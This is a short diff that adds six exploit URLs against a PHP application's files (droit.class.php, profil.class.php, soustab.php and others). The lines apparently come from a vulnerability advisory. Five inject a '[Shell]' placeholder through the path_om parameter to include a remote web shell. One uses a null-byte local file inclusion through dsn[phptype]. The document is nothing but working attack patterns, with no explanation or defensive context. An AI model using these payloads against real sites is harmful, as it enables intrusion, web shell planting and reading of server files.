@@ -1,0 +1,6 @@
+http://www.example.com/[path]/obj/droit.class.php?path_om=[Shell]
+http://www.example.com/[path]/obj/collectivite.class.php?path_om=[Shell]
+http://www.example.com/[path]/obj/utilisateur.class.php?path_om=[Shell]
+http://www.example.com/[path]/obj/courrier.class.php?path_om=[Shell]
+http://www.example.com/[path]/obj/profil.class.php?path_om=[Shell]
+http://www.example.com/[path]/scr/soustab.php?dsn[phptype]=[LFI%00]
